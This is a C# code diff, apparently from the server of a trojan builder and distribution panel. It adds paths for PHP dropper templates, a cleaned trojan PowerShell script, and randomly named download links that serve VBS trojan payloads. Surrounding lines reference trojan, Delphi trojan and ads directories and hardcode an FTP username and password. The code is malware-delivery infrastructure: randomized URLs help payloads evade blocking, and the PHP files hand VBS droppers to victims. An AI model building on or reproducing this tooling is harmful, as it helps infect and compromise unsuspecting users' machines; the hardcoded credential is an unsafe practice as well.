@@ -49,6 +49,8 @@ namespace model
 
         [JsonPropertyName("cpDir")] public string CpDir => ServerModelLoader.CpDirStatic;
         [JsonPropertyName("certDir")] public string CertDir => ServerModelLoader.CertDirStatic;
+        [JsonPropertyName("phpDir")] public string PhpDir => ServerModelLoader.PhpDirStatic;
+        [JsonPropertyName("phpTemplateFile")] public string PhpTemplateFile => Path.Join(PhpDir, ".\\dn.php");
         [JsonPropertyName("sysDir")] public string SysDir => ServerModelLoader.SysDirStatic;
         [JsonPropertyName("adsDir")] public string AdsDir => ServerModelLoader.AdsDirStatic;
         [JsonPropertyName("publishedAdsDir")] public string PublishedAdsDir => ServerModelLoader.PublishedAdsDirStatic;
@@ -58,6 +60,7 @@ namespace model
         
         [JsonPropertyName("troyanDir")] public string TroyanDir => ServerModelLoader.TroyanDirStatic;
         [JsonPropertyName("troyanScript")] public string TroyanScript => Path.Join(TroyanDir, ".\\_output\\troyan.ps1");
+        [JsonPropertyName("troyanScriptClean")] public string TroyanScriptClean => Path.Join(TroyanDir, ".\\_output\\troyan.c.ps1");
         
         [JsonPropertyName("troyanScriptDir")] public string TroyanScriptDir => ServerModelLoader.TroyanScriptDirStatic;
         [JsonPropertyName("troyanDelphiDir")] public string TroyanDelphiDir => ServerModelLoader.TroyanDelphiDirStatic;
@@ -85,6 +88,23 @@ namespace model
         
         [JsonPropertyName("userVbsFileClean")] public string UserVbsFileClean => Path.Join(UserDataDir, "troyan.c.vbs");
         [JsonPropertyName("userLiteVbsFileClean")] public string UserLiteVbsFileClean => Path.Join(UserDataDir, "litetroyan.c.vbs");
+        
+        
+        public string Random()
+        {
+            return VbsRandomer.GenerateRandomVariableName(10);
+        }
+        
+        [JsonPropertyName("dnVbsLinkShort")] public string DnVbsLinkShort => $"{Server}/default/{Random()}/none/GetVbs";
+        [JsonPropertyName("dnVbsLink")] public string DnVbsLink => $"http://{Alias}/{DnVbsLinkShort}";
+        [JsonPropertyName("phpVbsLinkShort")] public string PhpVbsLinkShort => $"{Server}/default/GetVbsPhp";
+        
+        [JsonPropertyName("dnLightVbsLinkShort")] public string DnLightVbsLinkShort => $"{Server}/default/{Random()}/none/GetLightVbs";
+        [JsonPropertyName("dnLightVbsLink")] public string DnLightVbsLink => $"http://{Alias}/{DnLightVbsLinkShort}";
+        [JsonPropertyName("phpLightVbsLinkShort")] public string PhpLightVbsLinkShort => $"{Server}/default/GetLightVbsPhp";
+        
+        [JsonPropertyName("userPhpVbsFile")] public string UserPhpVbsFile => Path.Join(UserDataDir, "dn.php");
+        [JsonPropertyName("userPhpLightVbsFile")] public string UserPhpLightVbsFile => Path.Join(UserDataDir, "dn_light.php");
 
         //FTP
         [JsonPropertyName("ftp")] public string Ftp => $@"ftp://ftpData:Abc12345!@{Server}";
